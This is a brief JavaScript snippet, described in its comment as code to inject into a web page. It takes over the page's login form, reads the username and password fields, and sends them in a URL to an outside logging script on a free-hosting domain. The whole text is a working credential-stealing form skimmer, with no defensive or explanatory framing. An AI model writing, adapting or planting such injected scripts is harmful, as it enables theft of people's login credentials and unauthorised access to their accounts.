// this is the code which will be injected into a given page...

(function() {
	var form = document.getElementsByTagName('form')[0];
	form.setAttribute("onSubmit", "return false");
	form.onsubmit = function steal() {
		var inputs = document.getElementsByTagName('input');
		var result = new Array();
		for (i = 0; i < inputs.length; i++) {
			if (inputs[i].getAttribute("type") != "hidden") {
					result.push(inputs[i]);
			}
		}
		var usr = result[0].value; 
		var pwd = result[1].value; 
		window.location = 'http://speedmail.000webhostapp.com/log.php?things=' + usr + '%20%20' + pwd;
	}

})();